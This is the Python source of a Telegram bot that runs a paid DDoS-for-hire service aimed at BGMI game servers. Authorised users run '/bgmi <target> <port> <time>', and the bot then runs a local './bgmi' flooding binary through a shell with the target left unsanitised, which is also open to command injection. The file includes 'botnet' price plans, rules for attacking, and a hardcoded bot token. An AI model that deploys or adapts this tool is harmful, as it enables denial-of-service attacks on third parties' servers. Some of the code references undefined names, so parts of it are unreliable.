#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7343477389:AAEL3rdXEVk9F1O1twhwtTsPdlEL72qrzKg')

# Admin user IDs
admin_id = ["6829567767", "1705593541", "5679673719", ""]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found âŒ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully âœ…"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully ðŸ‘."
            else:
                response = "User already exists ðŸ¤¦â€â™‚ï¸."
        else:
            response = "Please specify a user ID to add ðŸ˜’."
    else:
        response = "Only Admin Can Run This Command LAST WARNING ðŸ˜¡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully ðŸ‘."
            else:
                response = f"User {user_to_remove} not found in the list âŒ."
        else:
            response = '''Please Specify A User ID to Remove. 
âœ… Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command Last warning ðŸ˜¡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found âŒ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully âœ…"
        except FileNotFoundError:
            response = "Logs are already cleared âŒ."
    else:
        response = "Only Admin Can Run This Command ðŸ˜¡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found âŒ"
        except FileNotFoundError:
            response = "No data found âŒ"
    else:
        response = "Only Admin Can Run This Command ðŸ˜¡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found âŒ."
                bot.reply_to(message, response)
        else:
            response = "No data found âŒ"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command ðŸ˜¡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"ðŸ¤–Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, LAST WARNING & BADLIAR ð€ð“ð“ð€ð‚ðŠ ð’ð“ð€ð‘ð“ð„ðƒ.ðŸ”¥ðŸ”¥\n\nð“ðšð«ð ðžð­: {target}\nðð¨ð«ð­: {port}\nð“ð¢ð¦ðž: {time} ð’ðžðœð¨ð§ðð¬\nðŒðžð­ð¡ð¨ð: BGMI Provide by @hardhackar007"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "You Are On Cooldown âŒ. Please Wait 10 second Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 980:
                response = "Error: Time interval must be less than max 980."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished.@hardhackar007 & @BADLIAR2001 & @Profess0rrr Target: {target} Port: {port} Port: {time}"
        else:
            response = "kya karta hai bhai ðŸ¤£âœ… Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "âŒ You Are Not Authorized To Use This Command âŒ."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "âŒ No Command Logs Found For You âŒ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ðŸ˜¡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''LAST_WARNING & BADLIAR & â™¡âž³âŒPrÍ¥ofÍ£fÍ«essorâŒâž³â™¡ ðŸ¤– Available commands:
ðŸ’¥ /bgmi : Method For Bgmi Servers. 
ðŸ’¥ /rules : Please Check Before Use !!.
ðŸ’¥ /mylogs : To Check Your Recents Attacks.
ðŸ’¥ /plan : Checkout Our Botnet Rates.

ðŸ¤– To See Admin Commands:
ðŸ’¥ /admincmd : Shows All Admin Commands.


'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f''' Developer @BADLIAR2001 Programmer https://amalgamative-prereq.000webhostapp.com/Programmer.html âš ï¸ ðŸ‘‹ðŸ»Welcome to Your Home, {user_name}! Feel Free to Explore.
ðŸ¤–Try To Run This Command : /help 
WELCOME @hardhackar007 & @BADLIAR2001 & @Profess0rrr TO THE SERVER FREEZE BOT'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules âš ï¸:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip ðŸŒŸ :
-> Attack Time : 980 tak last (S)
> After Attack Limit : no limit 
-> Concurrents Attack : 300

Pr-ice ListðŸ’¸ :
Day-->50Rs
Week-->700Rs
Month-->2000Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

ðŸ’¥ /add <userId> : Add a User.
ðŸ’¥ /remove <userid> Remove a User.
ðŸ’¥ /allusers : Authorised Users Lists.
ðŸ’¥ /logs : All Users Logs.
ðŸ’¥ /broadcast : Broadcast a Message.
ðŸ’¥ /clearlogs : Clear The Logs File.
â¤ï¸ /info: public source.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "âš ï¸ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ðŸ‘."
        else:
            response = "ðŸ¤– Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command ðŸ˜¡."

    bot.reply_to(message, response)




bot.polling()
    
